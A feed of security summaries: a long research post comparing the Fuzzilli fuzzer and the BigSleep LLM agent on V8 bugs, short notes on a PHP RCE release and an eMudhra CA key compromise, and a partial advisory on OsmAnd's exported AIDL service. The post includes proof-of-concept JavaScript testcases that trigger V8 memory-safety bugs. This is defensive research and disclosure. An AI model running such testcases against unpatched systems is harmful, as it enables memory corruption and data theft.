items.summary: Summary Project Zero compared two automated tools used by Google to find vulnerabilities in Chrome’s JavaScript engine, V8, on a regular basis. Fuzzilli is a generative JavaScript engine fuzzer and BigSleep is an LLM-based bug finding system. In the past six months, BigSleep found more vulnerabilities than Fuzzilli (45 versus 37) with a 25% overlap in the specific bugs reported. Since this comparison methodology has a tendency to underestimate overlap, we also performed dedicated experiments to test theoretical overlap in vulnerabilities reported since 2023. These experiments estimated overlap at roughly 60%. Regardless of which value is accurate, a substantial portion of vulnerabilities were discoverable by only LLMs or only fuzzing. While it is extremely promising that LLMs have become able to find so many vulnerabilities so quickly, fuzzing and LLMs are still complementary approaches. We recommend vendors perform both fuzzing and agentic analysis of their code to maximize the number of vulnerabilities that get reported before they impact users. Introduction Fuzzing has long been successfully applied to software projects such as Chrome or V8 (Chrome’s JavaScript engine) to detect bugs. Recently, the arrival of powerful LLMs able to read, reason about, and write code is causing a transformative change to software development and software security. With hundreds, sometimes thousands of new bugs and vulnerabilities having been discovered in well-fuzzed targets, a natural question arises: how do new LLMs compare to “traditional” fuzzers? Are they starting to replace them or do the two approaches complement each other? To help answer this, we look at three key questions: How many bugs does each approach find in the real world? What is the overlap between the two approaches? What is the “shape” of bugs discovered by one system but not the other? For this blog post, we will limit ourselves to two concrete systems: Fuzzilli, a JavaScript engine fuzzer, and BigSleep, an agentic bug finding system. Both of these systems run in production and automatically look for bugs in newly added code, which makes them fairly directly comparable. Specifically, Fuzzilli runs continuously across many instances, with the first ones usually picking up new changes within a few hours, while BigSleep currently runs once per day and is prompted to review new commits and write proof-of-concept testcases for any bugs it discovers. Both systems report bugs through Clusterfuzz, which will do basic crash triaging, then file bug reports in Chrome’s issue tracker. We also limit ourselves to V8 as a target, a high-performance JavaScript and WebAssembly engine with a sophisticated and mature testing and fuzzing setup. In particular, Fuzzilli is a special-purpose fuzzing tool designed to find bugs in these engines. The usually complicated nature of these bugs makes for an interesting “playground” to compare the two approaches’ ability to find deep and complex bugs in well-tested software. We leave it to future work to perform similar analysis on a broader set of targets, fuzzers, and agentic bug finding systems. We will now look into each of the three main questions in a dedicated section. Each section will first summarize the general approach, then describe the methodology in detail (often as bullet points, so you can skip those blocks if you don’t care too much about the details) before exploring the results. We conclude with an attempt at interpreting the results to get a picture of the current state of fuzzing vs. AI. Part 1: Production Statistics This is the simplest part to analyze, although with some caveats we’ll see in a bit. The basic idea is to query issues from Chromium’s bugtracker (where V8 bugs are tracked) and extract various statistics from there. This is especially easy since there’s a dedicated hotlist for each of the two systems. We limit our analysis to the six months from April to September 2026 as the automatic BigSleep pipeline only became active in April this year. As such, our raw data comes from the following two bug tracker queries: Fuzzilli: hotlistid:5433121 created:2026-04-01..2026-09-30 BigSleep: hotlistid:8067258 created:2026-04-01..2026-09-30 From there, the raw numbers of bug reports are: Fuzzilli: 316 BigSleep: 441 Small win for BigSleep. However, this includes all types of bugs, and BigSleep initially also found a lot of configuration and integration issues in V8, for example crbug.com/503869331 where the unsafe flag blocking mechanism didn’t work properly yet. These are legitimate issues, but less relevant for our comparison since there’s little real-world security impact. One easy way to get rid of these is to look specifically at vulnerabilities by limiting the results to type:vulnerability: Fuzzilli: 178 BigSleep: 95 Suddenly a clear win for the fuzzers? Not quite. There are still some problems with this data, notably duplicates and unactionable reports (e.g. bugs closed as WAI). At first, this seems like a simple thing to fix: just include another constraint such as status:(fixed | verified). Unfortunately, things are a bit more complicated. Take for example Fuzzilli bug crbug.com/511935486. The events on this bug are basically: The bug is filed by Clusterfuzz on May 11 and assigned to an engineer The bug is closed by Clusterfuzz as the testcase no longer reproduces later that same day As such, this bug received zero developer interactions. Most likely what happened here is that this bug was a duplicate of another bug, crbug.com/511210507, but Clusterfuzz didn’t realize it as the crash signature (derived from the stack trace) was slightly different. When the other bug received a fix, the testcase stopped reproducing on Clusterfuzz, which closed the issue. Maybe the best thing we can do is to look at “actionable” bugs, defined as those that are not marked as duplicates or WAI and that received at least one fix commit referencing them. Then, looking at only Type-Vuln bugs filters out a lot of the less-relevant BigSleep bugs, even though these were “actionable”. With that, the final picture looks like this: So in terms of vulnerabilities, it’s roughly a tie (small advantage BigSleep) at the moment: 45 vs. 37. This naturally raises the question of cost: how expensive is each of the two approaches and what does that mean in terms of cost-per-bug? Unfortunately, it’s challenging to make a comparison at this stage in the research. While some effort has been dedicated to making Clusterfuzz more efficient, similar effort has not been expended for Big Sleep and neither system is particularly calibrated for an optimal cost-per-bug ratio. Part 2: Overlap The next question is how much these approaches overlap each other. For this, our approach is twofold: we first attempt to find an answer in the bugtracker, by trying to identify bugs discovered by both systems. Next, we run a dedicated experiment in which we let BigSleep try to rediscover old Fuzzilli bugs. Bugtracker Overlap The basic idea is to see which bugs were found by both systems, so we’re effectively looking for duplicate bug reports. Similar to part 1, there are a few steps we need to take to ensure we get a somewhat accurate picture: First, we look for bugs filed by one system that get deduplicated into a bug filed by the other. For example crbug.com/522410841 which is a duplicate of crbug.com/522860268. This is a clear overlap. Next, we need to take into account that many “unactionable” reports (those with zero associated fixes) are often duplicates. For those reports, we need to find the commit that fixed them, then look at the bug associated with that commit, and treat these two bugs as duplicates. This can be a multi-prong relationship: both bug X found by BigSleep and bug Y found by Fuzzilli might be a duplicate of bug Z reported by someone/something else. In that case, that bug still counts as overlap. Then, we need to realize that many duplicates never receive a bugtracker entry since they are already deduplicated at the Clusterfuzz level (since both Fuzzilli and BigSleep rely on Clusterfuzz for basic triage and bug filing). As such, we need to query Clusterfuzz’s underlying database to find more duplicates. Finally, we need to decide what to do with separate bugs that get fixed by the same CL, for example the four bugs fixed by crrev.com/c/7965120. While this can legitimately happen for distinct bugs, it’s probably more likely for the bugs to be duplicates (such as in this case), and so we count them as such. With all the different types of deduplication, we get this final picture: Again, looking at just the actionable vulnerability reports (likely the best measure), we see an overlap of roughly 25% (20 out of a total of 81), with a slight majority of these found first by Fuzzilli and later by BigSleep. Overlap Experiment The second way to measure the overlap is to run a dedicated experiment in which we try to re-discover bugs found by one system in the past using the other. Specifically, here we try to re-discover old Fuzzilli bugs using a BigSleep setup that’s as close to the production configuration as possible. For each bug we collect the commit that (likely) introduced the bug, and ask the agent to review those changes just as in the production CI environment. Note that the other direction, trying to rediscover past BigSleep bugs with Fuzzilli is more difficult to set up, since fuzzers cannot easily be given a similar “starting point”. Moreover, for many of these bugs we already know the outcome of such an experiment: the majority of “historic” BigSleep bugs (e.g. those from 2025) were found after fuzzers like Fuzzilli had already been fuzzing vulnerable builds for months, sometimes years. So they would most likely also not rediscover them in an experiment (except perhaps in a few cases where Fuzzilli was since updated to support new language features). Similarly, in production, BigSleep only reports crashes with a delay of 1-2 days (as there’s currently only one run per day). As such, fuzzers also get a head-start there. In more detail, here is how the experiment is set up: We start with a list of historic Fuzzilli bugs (from early 2023 until mid-2026) by querying the bug tracker hotlist. This gives us around 1150 raw bugs. We restrict this to only type:vulnerability as these are the types of bugs we care most about and will remove some “noise” as above. We are left with roughly 600 vulnerabilities. Next, we filter this list down to bugs that reproduce in the environment used by the agent. This involves two parts: Bugs that reproduce on an x64 debug+asan build of the d8 shell as provided by Chrome’s public build infrastructure. This is important because many bugs only reproduce in special builds, for example because they are architecture-specific or need certain compile-time features. Bugs that can be reproduced without special flags. The problem here is that fuzzers often set custom flags, either to enable in-development features (e.g. --experimental-wasm-jspi in crbug.com/361123483) or to turn on different fuzzing modes that make certain types of bugs easier to discover (e.g. --deopt-every-n-times in crbug.com/362784006). However, we can’t let the agent set arbitrary flags on historic V8 builds as these didn’t have a “safe-flags only” mode (leading to many false-positive crashes), and we also don’t want to tell the agent which flags it should use for a given challenge as that would be a hint. As such, for simplicity we limit ourselves to bugs that can reproduce with a standard set of flags (--fuzzing, --jit-fuzzing, --expose-gc) and only allow the agent to set those. We end up with 132 historic bugs. We now perform some deduplication similar to what we did above to identify implicit duplicates, which we remove. This leaves us with a final number of 112 bugs. For a realistic comparison, we then convert these bugs into “code review challenges” similar to the ones used by the production BigSleep pipeline. For that, we try to identify the commit that (likely) introduced the bug, for example based on bisection. We note that this skews the comparison against BigSleep for two reasons: We likely sometimes identify the wrong commit that is unrelated to the bug in question, making the task harder or even impossible. We only have one commit per bug, while in the real world, the agent might discover the bug from another, subsequent commit that touches a similar part of the codebase. We now run the agent for 25 attempts on each commit. The agent is asked to find bugs related to the commit and prove their existence by writing a testcase that crashes the vulnerable build. The attempt is terminated once a crash is found, so each attempt can report at most one bug. We use essentially the same configuration that was used in production BigSleep at that time, including the same underlying model: Gemini 3.6 flash. Finally, we run some post-processing on the results to check if the agent found the “right” bug or an unrelated one. For that, we check that the testcase crashes the pre-fix revision but not the post-fix revision. This is imperfect but fairly easy to implement. Here are the results from the experiment: Starting from just the commits that (likely) introduced the bugs, BigSleep was able to re-discover ~62% of the original bugs, while finding a different (but by now fixed) bug for another ~12% of commits. On around 26% of the commits it failed to find any bugs. Memorization One thing to worry about with experiments such as this one is memorization: the LLM remembering specific bugs from its (pre-)training data and as such having an easier time “re-discovering” them during evaluation. We can try to get some idea of the effect of this by looking at the success rates for bugs from different time spans, e.g. every half-year period for which we have bugs in the data set. If there was memorization, we’d expect higher success rates (both for a single attempt and for the combined run) on bugs prior to the learning data cutoff of the model. Here are the results for our experiment: For the model used in this experiment (Gemini 3.6 flash), the knowledge cutoff date is March 2026. Combining that with the fact that in early 2026, Chrome bugs would only become publicly visible after ~3 months, the effective knowledge cutoff for Fuzzilli bugs should be around Jan 2026. Looking at the data, there seems to be no statistically significant amount of memorization pre-2026. We note, however, that this may be different for other models or future model generations and as such recommend that this be re-evaluated for similar experiments in the future. Difficulty A follow-up question we might ask is how the overlap compares with “difficulty”. For example, in the best case a system like BigSleep would easily find issues that fuzzers struggle with and vice versa. In that case, budget that was previously spent on long fuzzing sessions may now be re-allocated and put to different uses. Here are the results of analysing this, where “bug difficulty” is measured by the time it took Fuzzilli to discover the bug: While we do get a statistically significant result here (although not of particularly great magnitude), it actually points in the other direction! Bugs that are hard to find for a fuzzer are likely also hard to find for an AI agent. As such, those fuzzers should probably be kept running for now. Components Another thing we can look at is a per-component breakdown of the bugs and their rediscovery rates: Interestingly, the overlap is significantly smaller for compiler bugs. This is the area where Fuzzilli probably specializes most in, which may explain the results. Later on (in part 3), we’ll also develop another hypothesis for why (some) bugs in the compilers may be more difficult to rediscover for BigSleep. Prompting A final question is how much the specific prompting played a role in the performance of the AI agent. For that, we run two quick follow-up experiments, only on the bugs that weren’t previously re-discovered and with different prompts: Instead of starting from commits, we start from the vulnerable file or function. This may be an easier starting point but is still a fairly realistic setup since both can for example be obtained by extracting modified files and functions from a given commit. Instead of asking the agent to find memory corruption vulnerabilities (what we care most about), we specifically tell it that assertion failures and similar crashes are also desirable. Running these two experiments with only 5 attempts per bug (instead of the 25 used in the main experiment), the agent re-discovered 10 additional bugs in total: 8 from the different starting points and 7 with the rephrased prompt (with 5 found in both runs). In total, combining these results with our original experiment, we get the following picture: So the share of “correct” bugs found climbs to ~70%, and we find some kind of bug for ~84% of starting points. However, for fairness it should be noted that equivalent tweaks to a fuzzer could likely also result in higher discovery rates for certain bugs, so the results of this follow-up experiment should be treated with some caution. Summary The main results from our two angles are: In production, the overlap is noticeable but not substantial at around 25%. In our experiment, overlap was around 60% of historic Fuzzilli bugs (70% with additional runs that used different prompts). The overlap is not uniformly distributed: Bugs that are difficult for a fuzzer to find are more likely to also be difficult to find for an agent, so there’s more overlap on “easy” bugs. The overlap seems to be smaller in the JIT Compilers and higher in the rest of the engine. From just the experiment, we might expect a higher overlap in production. However, there are probably a few factors that prevent(ed) this: There’s a limited time window for overlaps: once a bug reported by either system is fixed, the other system no longer has a chance to rediscover it (as the bug won’t reproduce on Clusterfuzz and will therefore be discarded). Our experiment only looked at a subset of Fuzzilli bugs that reproduce on a standard x64 d8 fuzzer build and without special flags. In production, each system has access to slightly different and specialized builds, as well as different runtime flag constraints, and there the overlap is potentially smaller. Pipeline hiccups such as overloaded servers or bugs in the automation likely prevented a number of commits from being reviewed by BigSleep in the last months, so bugs introduced by them may have been missed. Since its introduction in April, the model underlying the BigSleep pipeline has been upgraded multiple times. Earlier models likely performed worse, and we expect future models to perform better. Part 3: Shape of Bugs In this section, we will first look at three case studies of bugs found by one system but not the other, then attempt to draw conclusions from these and other bugs. BigSleep: Chrome Bug 449760249 (October 2025) This bug is a nice example of BigSleep benefiting from the underlying model’s reasoning capabilities to discover a variant that was (likely) too complex to trigger by a fuzzer in a reasonable amount of time. It’s also a good example to show the general working of an agentic bug finding system. Background: TDZ and Hole Check Elision Before diving into the bug specifics, we first need to look at some JavaScript internals, specifically variable initialization. In JavaScript, variables declared with the let or const keywords cannot be used before they are initialized, and attempting to do so will lead to an exception (”ReferenceError: Cannot access 'foobar' before initialization”). In V8’s terminology, these variables reside in a “temporal dead zone” (TDZ) until they are initialized. Internally, V8 sets variables in the TDZ to a special sentinel value, the_hole, and then checks for this value when accessing the variable’s content. To limit the performance impact of these hole-checks, V8’s bytecode compiler implements an optimization (behind the default-enabled --ignition-elide-redundant-tdz-checks flag) to identify redundant checks and subsequently remove them. The idea here is to identify “dominating” checks where it can then be guaranteed that a hole-check has already been performed for a given variable on all possible paths leading to the current position. This is a security-relevant optimization as an incorrectly removed hole-check would result in the internal the_hole value leaking to JavaScript code, a condition that has historically been exploitable (although new mitigations for this bug class have since shipped). The Original Vulnerability The original bug (issue 40071027 - discovered two years earlier by Fuzzilli!) involved do-while loops containing a break statement. In a do-while loop, the loop condition evaluates after the body. If the condition contains an assignment to a variable, the bytecode compiler will mark the variable as initialized. However, if a break statement executes in the loop body in the first iteration, then the condition will never execute. The bytecode compiler originally failed to account for this, leading to an incorrectly omitted hole check and subsequent leak of the_hole value. To fix this, the implementation of BytecodeGenerator::VisitDoWhileStatement was modified in the following way: - VisitForTest(stmt->cond(), ...); + if (!loop_builder.break_labels()->empty()) { + HoleCheckElisionScope elider(this); + VisitForTest(stmt->cond(), ...); + } else { + VisitForTest(stmt->cond(), ...); + } Specifically, the patch works by creating a HoleCheckElisionScope for processing the condition code in case the loop contains break statements. This means that any updates to the TDZ state of variables will be discarded once the scope object is destroyed. As such, code after the loop will see the previous TDZ state (which is the correct behavior in this case). Discovery of the Variant The BigSleep agent began its analysis by examining the patch to VisitDoWhileStatement, realizing that the fix relied on loop_builder.break_labels()->empty() to decide if a protective HoleCheckElisionScope was required. It then began creating and testing various hypotheses for scenarios in which no break statement was registered with a given loop but the condition would still be skipped at runtime. For example, it hypothesized that a try-catch in combination with a throw inside the loop might confuse the hole-check elision logic. It then investigated how try-catch was implemented in the bytecode compiler and concluded that this was handled correctly. Eventually, the agent started investigating labeled breaks, which allow directly breaking out of inner loops. It hypothesized that these might not be handled correctly and continued to investigate how these were being processed, for example by studying the logic in BytecodeGenerator::VisitBreakStatement. This time, it seemed to have identified a real flaw: in the case of nested breaks, the inner loop was apparently not being informed of the existence of a break statement! It therefore formulated the following vulnerability hypothesis: If a labeled break inside a do-while loop targets an outer scope, the inner do-while loop’s LoopBuilder is not notified. Consequently, loop_builder.break_labels()->empty() remains true. Therefore, when generating the code for the loop condition, the HoleCheckElisionScope introduced by the patch is not used. The condition is bypassed at runtime, but the bytecode compiler erroneously removed a later hole-check, leading to a leak of the_hole to JavaScript. The agent then began writing a testcase to prove the existence of this bug. The initial attempt with simply two nested loops and a label failed, however, as the bytecode compiler would add another protective scope object for the labeled block. To work around this, the agent decided to use a switch statement. When handling a switch statement, the bytecode compiler uses a HoleCheckElisionMergeScope to compute the intersection of initialization states across all branches. By ensuring that the variable was initialized in a default case, the merge logic then concluded that the variable was correctly initialized on all paths. Proof of Concept With that, the agent had everything in place to produce a testcase to demonstrate the vulnerability. Below is the agent’s PoC: // Flags: --ignition-elide-redundant-tdz-checks function trigger(cond) { { target: switch(1) { case 1: do { // Labeled break targeting the switch. The do-while LoopBuilder remains unaware. if (cond) break target; } while((x=1) && false); // Condition performs a check/assignment on x. break; default: x=1; // Ensure x is considered initialized across all switch branches for merging. } // Generator incorrectly believes x is checked/initialized. Elides TDZ check. x + 1; let x; } } trigger(true); Here is how this testcase works: trigger(true) executes, entering case 1 of the switch. The do-while loop executes break target. Control flow jumps to the end of the switch, bypassing the do-while condition where x is assigned. At runtime, x remains uninitialized (holding the_hole). Because the TDZ check was elided at compile time, the engine leaks the internal the_hole value to JavaScript code in the x + 1 expression, leading to a potentially exploitable condition. We can see how this bug would be difficult for a fuzzer to find since the testcase is quite complex. While a coverage-guided fuzzer would have received rewards for triggering individual code paths (such as the handling of labeled break, the switch statement, the do-while loop, etc. in the parser), there is no additional reward for putting these together “in the right way” and so ending up with a testcase like this is quite difficult. BigSleep: Chrome Bug 443765373 (September 2025) This bug is an example of a relatively simple bug type that is challenging to discover with standard fuzzing approaches. Background: Exception handling in V8 To understand this bug, it is necessary to briefly look into exception handling in V8. Take the following example JavaScript code: function simple() { try { throw 42; } catch (e) { return e; } } Here, we have a function consisting of a try-catch block in which an exception is raised. Running this in d8 with --print-bytecode, we can see the internal bytecode that the engine generates to execute the JavaScript code: [generated bytecode for function: simple] 0x2ad5001000e4 @ 0 : 1b ff f9 Mov <context>, r0 0x2ad5001000e7 @ 3 : 0d 2a LdaSmi [42] 0x2ad5001000e9 @ 5 : b5 Throw 0x2ad5001000ea @ 6 : d1 Star1 0x2ad5001000eb @ 7 : 8d f8 00 CreateCatchContext r1, [0] 0x2ad5001000ee @ 10 : d2 ... ... 0x2ad5001000f7 @ 19 : b7 Return Handler Table (size = 16) from to hdlr (prediction, data) ( 3, 6) -> 6 (prediction=1, data=0) For the purpose of this bug, the relevant part is mostly the last line of the output. Here, the bytecode essentially says “if there is an exception while the PC is between offset 3 and 6 in this bytecode, then execution should continue at offset 6 (the start of the exception handler)”. The Bug The agent spotted the bug while looking at the following function, responsible for writing the handler table data structure in memory: void HandlerTable::SetRangeHandler(int index, int handler_offset, CatchPrediction prediction) { int value = HandlerOffsetField::encode(handler_offset) | HandlerWasUsedField::encode(false) | HandlerPredictionField::encode(prediction); int offset = index * kRangeEntrySize + kRangeHandlerIndex; Memory<int32_t>(raw_encoded_data_ + offset * sizeof(int32_t)) = value; } Here, the int offset is being combined with a few other bits of data into a new int value. As such, the handler_offset cannot have the full integer range in the new field, possibly leading to integer truncation issues. The agent then investigated the specific bounds of these values and realized that the HandlerOffsetField had only 28 bits (allowing for 256MB) while the maximum bytecode size was 512MB! From there it was relatively simple to craft a testcase that crashes, simply by creating a huge function (resulting in >256MB of bytecode) with an exception handler at the end, then triggering an exception inside of it. The result is a jump to a wrong bytecode offset, a primitive that’s easily exploited. Here is the relevant part of the testcase: // yield statements turn into a large chunk of bytecode let kNumYields = 500000; let body = ` if ("foo" === "bar") { ${"yield* 42;".repeat(kNumYields)} } try { throw 42; } catch (e) { // Will never get here } `; Such a testcase would again be difficult to craft by a fuzzer as the fuzzer isn’t rewarded for creating large code (at least not with generic coverage feedback). In fact, the fuzzer is likely even actively discouraged from finding this bug since generating and executing large bytecode takes some time (in debug builds, the testcase generated by the agent needs a few seconds to trigger) and would therefore probably have led to timeouts during fuzzing. Fuzzilli: Chrome Bug 40076141 (November 2023) This bug is a good example of a type of bug that is likely difficult to find just by looking at (one part) of the source code. It was originally discovered by Fuzzilli and not rediscovered by any of the experiments from part 2. Background: Value Representation in V8 Consider the following piece of JavaScript code: let i = 42; let f = 13.37; let s = "foobar" i = s; Here we create multiple variables holding values of different types. Note, however, that we never declare the type of a variable, and that variables can hold values of different types throughout their lifetime (i first contains an integer, later a string). What we see here is that JavaScript is a dynamically typed language, and so variables (and also object fields, etc.) have no fixed type. However, the actual runtime values still need to have a type: the engine somehow needs to know that foobar is a string value and that certain operations (e.g. substring search) can therefore be performed on it. Conceptually, this is possible by representing runtime values with a struct such as enum JSType { JS_TYPE_INT, JS_TYPE_FLOAT, JS_TYPE_STRING, ... }; struct JSValue { JSType type; // Either the raw value or a pointer to another object, e.g a JSString. uintptr_t value; }; However, this is somewhat inefficient since we now need something like 16 bytes to represent a simple 4-byte integer at runtime. As such, modern JS engines use clever tagging schemas, which rely on unused pointer bits to encode type information. Specifically, in V8 the JSValue type is a tagged pointer (or just tagged for short) which stores one bit of type information in the least-significant bit: If the bit is one, then the value minus 1 is a pointer to another object. This works because objects are aligned and so cannot start at an uneven address. If the bit is zero, then the next 31 bits contain a raw integer value (also called a small integer - Smi) As such, to figure out the type of a value at runtime, the engine first looks at the least-significant bit. If that is zero, the value can be “untagged” to obtain the integer value by right-shifting by one. On the other hand, if the bit is one, the value is a valid pointer to an object that contains further type information. For more details on V8’s pointer tagging scheme see also this blog post. The Testcase Let’s start by looking at the testcase produced by the fuzzer, which isn’t overly long: function f0() { let v2 = 1; for (let i3 = v2; i3 >= v2; i3 += v2) { v2 = v2 && i3; } } f0(); The bug is caused during optimization of the loop by the Maglev compiler, specifically due to a conflict between two stages of the compiler pipeline: the initial graph builder and the later MaglevPhiRepresentationSelector. The Graph Builder The graph builder is responsible for building the initial Maglev intermediate representation (IR) of the code. For that, it consumes both the input code (in the form of V8 bytecode) as well as runtime feedback that was collected while the code executed in lower tiers such as the interpreter. When processing the loop in this testcase, the following happens: Both i3 and v2 are modified during the loop. Since the IR uses static single-assignment (SSA) form, these turn into Phi nodes, which make the code look like every variable only has a single assignment :) For the i3 >= v2 comparison, the runtime feedback states that i3 was so far always a Smi and therefore speculates that this will be the case in the future. It guards this assumption by emitting a CheckedSmiUntag, which will extract the raw int from the tagged value and will bail out to the interpreter if the input is ever not a Smi. For the following operations on v2, the compiler can then rely on the existing check and emit UnsafeSmiUntag nodes, which avoid the runtime checks but are only safe to use if the input is guaranteed to be a Smi. The resulting code for the loop now looks roughly like this (in Maglev pseudocode): loop: i3 <- Phi(1, i3_next) // loop variable, tagged v2 <- Phi(1, v2_next) // loop variable, tagged i3_int <- CheckedSmiUntag(i3) // deopt if i3 is not a Smi v2_int <- CheckedSmiUntag(v2) // deopt if v2 is not a Smi if i3_int < v2_int: break v2_next <- Phi(i3, v2) // result of `v2 && i3`: "known Smi" v2_next_int <- UnsafeSmiUntag(v2_next) // no (re-)check needed i3_next_int = i3_int + v2_next_int i3_next <- Int32ToNumber(i3_next_int) // tag the int32 result for the phi The MaglevPhiRepresentationSelector The purpose of this optimizer is to identify Phi nodes where all inputs have the same raw representation (e.g. int32), and if so convert the Phi to that representation to avoid future untagging operations. For the code above, the code sees that both inputs to i3 are int32 and therefore decides to convert the Phi to int32 representation. Following CheckedSmiUntag operations then become a no-op and can be removed, while consumers that need a tagged value now require a conversion step. With that, the final code now looks like this: loop: i3 <- Phi(1, i3_next) // all inputs int32, so i3 becomes a raw int32 v2 <- Phi(1, v2_next) // stays tagged v2_int <- CheckedSmiUntag(v2) if i3 < v2_int: break // CheckedSmiUntag(i3) removed as a no-op i3_tagged = Int32ToNumber(i3) // HeapNumber if i3 >= 2^30! v2_next <- Phi(i3_tagged, v2) // stays tagged, needs tagged inputs v2_next_int <- UnsafeSmiUntag(v2_next) // HeapNumber pointer treated as a Smi i3_next <- i3 + v2_next_int // tagging no longer needed here The Conflict The bug now occurs because of two optimizations interacting badly with each other: The graph builder uses UnsafeSmiUntag as it believes that the value must be a Smi at this point The representation selector removes a CheckedSmiUntag as it believes it is no longer required Specifically, what can happen now is that eventually, i3 becomes larger than the maximum Smi value. At that point, Int32ToNumber can no longer fit the integer into a Smi and instead allocates a HeapNumber object (a container holding a larger number, basically). At this point, however, the UnsafeSmiUntag is no longer safe as the input is now a pointer. This leads to a corrupted pointer value being extracted and subsequently to memory corruption. Note that in the original code, this could not have happened as the HeapNumber would’ve been rejected by the CheckedSmiUntag(i3). What may have made this bug difficult to find for BigSleep is the fact that both optimizations are correct in isolation. As such, looking at just one of them would’ve made it difficult to spot the issue. The agent would somehow have needed to hypothesize about the other optimization or stumbled upon the relevant code by chance (or exhaustive search). Overview Looking at the examples above as well as other bugs found by LLMs, we can see a few clear examples of bugs where an LLM has the advantage: Bugs that require complex logic to trigger but can be found through progressive logical reasoning and experimentation with the target program, such as crbug.com/449760249 discussed above. This is likely the strongest advantage. Bugs that require specific “magic” values (e.g. edge-case integers, specific strings, etc.), such as crbug.com/443765373 discussed above. Bugs that require new (or less common) features that a fuzzer may not be aware of. Examples include crbug.com/436181695, where the fuzzer didn’t support the new await using syntax yet, and in fact also crbug.com/449760249 above where Fuzzilli lacked support for labeled breaks at the time. Bugs that require a non-standard harness, custom flags, or special helper tools/functions that a fuzzer is not configured to use (e.g. crbug.com/516833326 which required --expose-fast-api and the d8.test.FastCAPI API). On the other hand, here are some advantages that fuzzers enjoy (for now): They can find “non-local” bugs reasonably well if not too many individual pieces are required. crbug.com/40076141 discussed above is an example for such a bug. They can find bugs that are hard to spot by reasoning about the source code alone. One clear example would be bugs caused by (incorrect) C++ compiler optimizations such as crbug.com/500771385. Another potential example is bugs such as crbug.com/414840455, which are related to handling dead code in V8’s compilers. This is likely an unusual state and therefore may be hard to reason about. BigSleep missed a few of these in our experiments. They are immune to certain biases affecting the agentic approaches, such as the choice of starting point (e.g. commits), the exact prompt phrasing, or the bug types seen (and not seen) during training. They do suffer from other types of biases though (e.g. the weights of individual mutators and generators). They don’t get distracted by “shallow” bugs, whereas BigSleep missed a few bugs because it found easier ones instead. This is probably somewhat self-correcting though as the shallow bugs would eventually get fixed, giving the agent another chance to discover the deeper bug. There is probably also a category of bugs that are hard to find for both approaches: bugs that are very non-local (bad for the agent) and require complex testcases (bad for the fuzzer) to trigger. In this case, a fuzzer would probably discover the individual pieces of the testcase (through coverage feedback) but won’t be able to find the right combination to trigger the bug (as in our first example). A code-reviewing agent, on the other hand, may struggle with the large search space of code fragments that may interact badly with each other (as in our last example). This is only a hypothesis, however, and would require further experiments and data to validate. Part 4: Conclusion In this blog post, we’ve compared coverage-guided fuzzers with vulnerability-discovery agents that read and reason about the source code. Specifically, we’ve looked at Fuzzilli and BigSleep, which both run as automated pipelines on V8 to discover newly introduced bugs. Looking at the data from those pipelines, we saw a roughly equal share of vulnerabilities found in the last 6 months (around 40 each), and a moderate overlap in discovered bugs of around 25%. However, in a dedicated experiment, overlap was closer to 60%. For now, this means that the two approaches remain complementary, and specialized fuzzing continues to provide value by finding bugs quickly and identifying certain kinds of issues that are otherwise hard to spot. At the same time, LLMs only very recently became capable of finding bugs in software like V8 at all, and have made tremendous progress since. The model used for our experiment is by now already outdated and outperformed by newer generations. Looking to the future, we expect further model improvements, potentially coupled with better prompting and more flexible harnesses (that e.g. allow the model to build, improve, and run fuzzers itself instead of being limited to pure code auditing), to lead to a growing share of bugs being discovered by agentic systems.

items.summary: Today's PHP Security Release, and How We're Strengthening PHP Security If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC. It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof of concept working against a number of targets and revealed a few additional, though limited, details about the vulnerabilities. Copies of the deleted video started circulating on social media soon after. The video contributed to accelerated development of various PoCs (exploitation proof of concepts), which then increased circulation on October 21st. This article from the team that discovered the original vulnerability includes a more detailed timeline of the original intended responsible disclosure: August 19, 2026: Wiz Research discovers the first PHP vulnerability using Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol. August 20, 2026: Unauthenticated RCE is confirmed against Drupal. August 21, 2026: Unauthenticated RCE is confirmed against WordPress. August 24, 2026: Wiz Research reports the vulnerabilities to the PHP security team. September 21, 2026: PHP acknowledges the reports and begins developing a coordinated fix. October 21, 2026: Patched PHP releases become available. October 21, 2026: Public disclosure. Via Hacker News Tags: open-source, php, security, ai, ai-security-research

items.summary: eMudhra Intermediate CA Compromise This is very, very bad news: The private keys of eight eMudhra intermediate CA certificates have been compromised. They chain to roots trusted by the Mozilla, Microsoft, Apple and Chrome root programs and by many downstream trust stores. Any software that bundles a list of trusted certificates needs to be updated. This site is tracking software updates via this GitHub repository - Linux distros need to update their ca-certificates packages. In Python world uv 0.13.4 and pip 26.2.2 and certifi 2026.10.19 have been released with upgraded certificate lists. There's a very informative thread about this on the official Python forum. Tags: encryption, https, pip, python, security, uv

items.summary: Coordinated Disclosure Timeline 2026-04-14: Sent reports via email to support@osmand.net 2026-06-28: Maintainer confirmed all vulnerabilities fixed. Summary OsmAnd version 5.3.3 is vulnerable because of the exported and permissionless OsmandAidlServiceV2, which auto-approves any caller via the isAppEnabled method. This vulnerability allows unauthorized applications to exploit all 97 AIDL methods, enabling attacks such as path traversal via copyFileImpl and real-time GPS location theft via getAppInfo. Project osmand Tested Version 3043c92b27b24a0b2c848bc7041cf5f69ede4ed6 OsmAnd_5.3.3 Details The exported OsmandAidlServiceV2 auto-approves any caller via isAppEnabled() in OsmandAidlApi.java, granting a zero-permission app access to all 97 AIDL methods — enabling both path traversal and real-time GPS location theft (GHSL-2026-109) Attack surface OsmandAidlServiceV2 is exported with no android:permission attribute (AndroidManifest.xml): <service android:name="net.osmand.aidl.OsmandAidlServiceV2" android:exported="true" > <intent-filter> <action android:name="net.osmand.aidl.OsmandAidlServiceV2"/> <category android:name="android.intent.category.DEFAULT"/> </intent-filter> </service> The V1 service OsmandAidlService is identically exported without a permission (AndroidManifest.xml). Compare to DownloadService which does declare android:permission="${applicationId}.SERVICE_PERMISSION". Any app on the device can bindService() to these services with zero Android permissions and zero user interaction. Authorization bypass — 